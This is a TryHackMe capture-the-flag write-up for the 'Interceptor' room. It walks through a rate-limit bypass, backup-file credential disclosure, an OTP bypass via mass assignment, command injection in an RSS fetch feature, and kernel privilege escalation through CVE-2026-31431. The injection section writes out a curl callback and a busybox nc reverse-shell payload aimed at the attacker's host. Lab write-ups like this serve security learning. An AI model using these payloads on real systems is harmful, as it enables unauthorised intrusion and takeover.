# Interceptor - TryHackMe CTF

## Overview

The goal of this room was to use Burp Suite and HTTP interception knowledge to modify application traffic and chain several vulnerabilities until I gained a shell and then escalated to root.

The attack path I followed was:

- Port and service enumeration
- Login rate-limit bypass
- Backup file discovery
- Credential discovery
- OTP verification bypass through Mass Assignment
- Dashboard access
- Command Injection
- Reverse shell as `www-data`
- Linux privilege escalation
- Copy Fail (`CVE-2026-31431`)
- Root access

The main attack chain was:

```text
Recon
    ↓
Login Enumeration
    ↓
Backup File Discovery
    ↓
Credential Discovery
    ↓
OTP Bypass
    ↓
Mass Assignment
    ↓
Dashboard Access
    ↓
Command Injection
    ↓
www-data
    ↓
CVE-2026-31431
    ↓
root
```

---

## 1. Reconnaissance

I started by enumerating the target with RustScan and passed the results to Nmap for service and version detection.

```bash
rustscan -b 500 -a interceptor.thm --top -- -sC -sV -Pn
```

I used:

- `-b 500` to control the RustScan batch size
- `--top` to scan the most common ports
- `-sC` to run Nmap's default NSE scripts
- `-sV` for service/version detection
- `-Pn` to treat the target as online without relying on ICMP

The scan revealed three open TCP ports:

```text
22/tcp  SSH
53/tcp  DNS
80/tcp  HTTP
```

The services included:

```text
OpenSSH 8.2p1
ISC BIND 9.16.1
Apache 2.4.41
```

I then visited the web application and found the login page:

```text
http://interceptor.thm/index.php
```

The actual login endpoint was:

```text
http://interceptor.thm/login.php
```

---

## 2. Login Rate-Limit Bypass

I started testing the login page with standard credentials and common authentication payloads.

After several attempts, the application returned:

```text
too many login attempts
```

I investigated whether the rate limiting could be bypassed.

Two possible approaches stood out:

```http
X-Forwarded-For: 127.0.0.1
```

or changing the:

```text
PHPSESSID
```

value.

The application appeared to rely on client-controlled information when enforcing the login attempt limit.

### What I Learned

Rate limiting is only effective when the application correctly identifies the source of the requests.

When testing authentication controls, I should check whether changing headers such as `X-Forwarded-For` or session identifiers affects the rate limit.

However, I could not directly enumerate valid usernames from the login responses because the application returned generic messages.

---

## 3. Directory Enumeration & Backup Files

Since the login page was not giving me useful information, I moved on to directory enumeration.

I used Feroxbuster:

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://interceptor.thm' -x php
```

This revealed additional endpoints, including:

```text
login.php
otp.php
dashboard.php
```

The OTP page appeared to be used after successful authentication.

The dashboard existed as well, but I could not access it without authentication.

At this point, I started thinking about backup files.

I expanded the extensions used during enumeration:

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://interceptor.thm' -x php,php.bak,php~
```

This revealed:

```text
login.php.bak
```

I also considered other common backup extensions:

```text
.bak
.backup
.bk
.bkp
.old
.orig
.original
.previous
.save
.saved
.swp
.swo
.swn
```

The interesting file was:

```text
http://interceptor.thm/login.php.bak
```

### What I Learned

Backup files are an important part of web enumeration.

A developer may leave behind:

- `.bak`
- `.old`
- `.orig`
- editor swap files
- previous versions of source code

These files can expose application logic, credentials, comments, debugging information or authentication mechanisms that are not visible from the live application.

---

## 4. Credential Discovery

I requested the backup login page and inspected its contents.

The file exposed information about the administrator test accounts and also contained a hint about the password.

The password consisted of two parts, with the second part being relatively easy to guess.

I used this information to determine the administrator credentials.

### What I Learned

Source code backups can be extremely valuable because they may expose information that the production application intentionally hides.

When I find a backup of a PHP file, I should treat it as source-code disclosure and inspect it for:

- Credentials
- Password hints
- Database configuration
- Authentication logic
- Hidden endpoints
- Developer comments
- Debugging functionality

---

## 5. OTP Verification Bypass

After obtaining the login credentials, I returned to:

```text
http://interceptor.thm/login.php
```

The application then required an OTP.

The OTP endpoint was:

```text
http://interceptor.thm/otp.php
```

At first, I considered brute-forcing the OTP because the endpoint was not rate limited.

However, I found a much more interesting approach using Burp Suite.

I intercepted the OTP verification request and sent an arbitrary OTP.

The application responded that I was not verified.

I then inspected the request parameters and noticed that the application was accepting additional user-controlled properties.

I tested whether I could set:

```text
is_verified=true
```

instead of supplying the correct OTP.

This worked.

The application accepted the modified value and considered the account verified.

### Mass Assignment

This behavior is known as **Mass Assignment**.

The vulnerability occurs when user-supplied parameters are automatically bound to internal object properties without restricting which properties can be modified.

In this case, the application allowed me to directly manipulate:

```text
is_verified
```

which should have been controlled exclusively by the server after successful OTP validation.

### Session Handling

After changing the verification state, I reloaded the page or reused the `PHPSESSID` associated with the OTP request.

I was then authenticated and redirected to:

```text
http://interceptor.thm/dashboard.php
```

### What I Learned

Mass Assignment is easy to miss if I only look at the expected parameters.

When intercepting requests, I should think:

> What happens if I add another parameter?

I should look for internal-looking properties such as:

```text
is_admin
is_verified
role
status
permissions
```

If the application automatically binds request parameters to internal object properties, these values may become attacker-controlled.

---

## 6. Dashboard Access

After bypassing the OTP verification, I successfully accessed the dashboard:

```text
http://interceptor.thm/dashboard.php
```

The dashboard contained two interesting functionalities:

- Profile picture upload
- RSS feed import/fetch functionality

I first investigated the profile picture upload.

---

## 7. Profile Picture Upload

I tested whether the profile picture upload could be abused to upload a PHP web shell.

I tried different techniques involving:

- Magic bytes
- Embedding a web shell inside an image
- MIME type manipulation
- File extension manipulation

The upload functionality appeared to be sufficiently protected against these techniques.

I therefore moved on to the RSS feed fetch functionality.

### What I Learned

A failed exploitation attempt is still useful information.

The upload feature appeared to validate the uploaded content well enough to prevent a straightforward PHP web shell.

Instead of repeatedly forcing the same attack path, I moved to another piece of functionality that processed user-controlled input.

---

## 8. Command Injection

The RSS/feed fetch functionality looked like it was executing a `curl` command in the background.

This made me suspicious of possible command injection.

I noticed that there was a filter for selected IP addresses, but there were no effective sanitization checks preventing shell command substitution.

I tested Bash command substitution using:

```text
$(...)
```

The idea was to make my command execute before the application's intended command.

I first wanted to verify command execution without immediately attempting a reverse shell.

I used:

```text
http://127.1$(curl http://192.168.135.32)
```

I monitored my own web server and received a request.

This confirmed that the target was executing my injected command.

### What I Learned

This was an important step because I did not immediately jump to a reverse shell.

I first used an external callback to prove that command execution was actually happening.

The general methodology was:

```text
Find suspicious functionality
        ↓
Understand how input reaches the command
        ↓
Test command execution
        ↓
Confirm with an external callback
        ↓
Only then attempt a shell
```

This gives much stronger evidence that the vulnerability is real.

---

## 9. Reverse Shell as `www-data`

After confirming command injection, I prepared a listener using Penelope:

```bash
penelope -p 4445
```

I then used command substitution to execute a reverse shell payload:

```text
http://127.1$(busybox nc 192.168.135.32 4445 -e bash)
```

The injected command used BusyBox's `nc` to connect back to my listener and execute Bash.

I received the connection and obtained a shell as:

```text
www-data
```

The user flag was located at:

```text
/var/www/user.txt
```

### What I Learned

The command injection gave me direct operating system command execution from the web application.

The important escalation was:

```text
Web Application
        ↓
Command Injection
        ↓
OS Command Execution
        ↓
Reverse Shell
        ↓
www-data
```

At this point, the objective changed from web enumeration to Linux privilege escalation.

---

## 10. Linux Privilege Escalation

With a shell as `www-data`, I started looking for a way to escalate to root.

The machine was a recent release, and I investigated whether a newly disclosed Linux kernel vulnerability could be applicable.

The vulnerability was:

```text
CVE-2026-31431
```

also known as:

```text
Copy Fail
```

The notes described it as a Linux kernel local privilege escalation vulnerability involving the `AF_ALG` crypto API.

The vulnerability allows an unprivileged local user to modify a small number of controlled bytes in the page cache of a readable file.

The affected mechanism involves the interaction between:

- `AF_ALG`
- `splice()`
- The Linux page cache
- The `algif_aead` implementation
- Affected cryptographic operations
- Setuid binaries

The important security consequence is that the in-memory cached version of a setuid binary can be modified even though the on-disk file itself is not directly changed.

---

## 11. Checking for Copy Fail

Before attempting exploitation, I first wanted to determine whether the machine appeared vulnerable.

I used a detection script:

```bash
python3 test.py
```

The result indicated that the machine might be vulnerable to:

```text
CVE-2026-31431
```

### What I Learned

Before using a kernel exploit, I should first determine whether the target is actually affected.

A good privilege escalation workflow is:

```text
Identify kernel version / environment
        ↓
Research potential vulnerabilities
        ↓
Check whether the target is vulnerable
        ↓
Attempt exploitation
```

This is more reliable than blindly running random kernel exploits.

---

## 12. Copy Fail Exploitation

After confirming that the target appeared vulnerable, I used the Copy Fail exploit.

The exploit was:

```text
CVE-2026-31431
```

I executed:

```bash
python3 exploit.py escalate
```

The exploit successfully escalated my privileges.

I became:

```text
root
```

### What I Learned

The interesting part of this privilege escalation was that I did not need a misconfigured SUID binary, writable cron job or leaked root password.

Instead, the escalation came from a vulnerability in the Linux kernel itself.

The important conceptual chain was:

```text
www-data
    ↓
Local Code Execution
    ↓
Kernel Vulnerability
    ↓
CVE-2026-31431
    ↓
Copy Fail
    ↓
Root
```

---

## 13. Overall Attack Chain

The complete attack path I followed was:

```text
RustScan / Nmap
        ↓
Web Enumeration
        ↓
Login Rate-Limit Bypass
        ↓
Directory Enumeration
        ↓
login.php.bak
        ↓
Credential Discovery
        ↓
Admin Login
        ↓
OTP Verification
        ↓
Mass Assignment
        ↓
is_verified=true
        ↓
Dashboard Access
        ↓
RSS Fetch Functionality
        ↓
Command Injection
        ↓
Command Substitution
        ↓
Reverse Shell
        ↓
www-data
        ↓
CVE-2026-31431 Detection
        ↓
Copy Fail Exploit
        ↓
root
```

---

## 14. Key Findings

| Vulnerability / Technique | Result |
|---|---|
| Login Rate-Limit Bypass | Allowed continued authentication testing |
| Backup File Disclosure | Exposed authentication-related information |
| Credential Exposure | Provided administrator credentials |
| OTP Verification Bypass | Bypassed MFA-style verification |
| Mass Assignment | Allowed modification of `is_verified` |
| Command Injection | Achieved arbitrary OS command execution |
| Reverse Shell | Obtained `www-data` access |
| CVE-2026-31431 | Escalated from `www-data` to root |

---

## 15. Final Takeaways

Interceptor was a good example of why I need to inspect the actual HTTP requests and understand how the backend processes user-controlled parameters.

The first major lesson was around authentication.

The application had a login rate limit, but the implementation could be bypassed. Then a backup file exposed useful authentication information, and the OTP mechanism could be bypassed through Mass Assignment.

The second major lesson was about following functionality after authentication.

The dashboard contained an RSS fetch feature that looked like it was executing `curl`. By testing command substitution, I was able to confirm command injection and eventually obtain a reverse shell as `www-data`.

Finally, instead of finding a traditional Linux misconfiguration, I identified a potentially vulnerable kernel and used:

```text
CVE-2026-31431 - Copy Fail
```

to escalate to root.

The most important mindset I took from this machine was:

> **Intercept everything and question what the application actually trusts.**

When testing a web application, I should not only look at the visible functionality. I should inspect:

- HTTP parameters
- Headers
- Cookies
- Session values
- Hidden object properties
- Backup files
- Backend commands
- Server-side processing

A small amount of unexpected trust in any of these areas can become the next step in an attack chain.